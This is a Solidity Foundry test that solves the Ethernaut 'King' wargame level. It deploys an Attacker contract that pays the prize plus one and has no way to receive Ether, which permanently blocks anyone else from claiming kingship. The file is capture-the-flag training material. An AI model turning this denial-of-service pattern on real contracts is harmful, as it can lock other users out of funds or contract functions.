pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IKing {
    function prize() external returns (uint256);

    function _king() external returns (address);
}

contract Attacker {
    function attack(address _king) external payable {
        (bool s, ) = payable(_king).call{value: msg.value}("");
        require(s);
    }
}

contract Ethernaut09 is EthernautTest {
    constructor() EthernautTest(9) {}

    function solve() internal override(EthernautTest) {
        Attacker attacker = new Attacker();
        attacker.attack{value: IKing(instance).prize() + 1}(instance);
    }
}
